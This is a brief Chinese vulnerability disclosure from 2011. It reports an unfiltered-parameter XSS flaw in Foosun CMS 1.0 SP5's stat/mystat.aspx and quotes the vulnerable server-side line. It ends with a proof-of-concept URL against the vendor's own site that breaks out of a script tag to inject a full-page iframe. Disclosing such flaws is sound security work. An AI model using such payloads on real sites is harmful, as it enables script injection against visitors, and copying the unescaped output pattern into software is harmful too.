@@ -1,0 +1,27 @@
+风讯CMS 1.0 SP5存在XSS漏洞
+
+漏洞详情
+
+披露状态：
+
+
+
+2011-08-02： 积极联系厂商并且等待厂商认领中，细节不对外公开
+2011-08-02： 厂商已经主动忽略漏洞，细节向公众公开
+
+
+简要描述：
+
+由于程序未对用户提交的数据进行过滤，导致XSS漏洞。
+
+详细说明：
+
+漏洞文件：stat/mystat.aspx
+ 
+document.write("<script>var code='<%=code%>';var url='<%=str_fs_url%>'; var statid='<%=statid %>'</script>")
+
+ code未进行过滤产生XSS漏洞
+
+漏洞证明：
+
+http://www.foosun.net/stat/mystat.aspx?code='</script>")<iframe src='http://www.baidu.com' width='100%' height='100%' frameborder=no border=0>
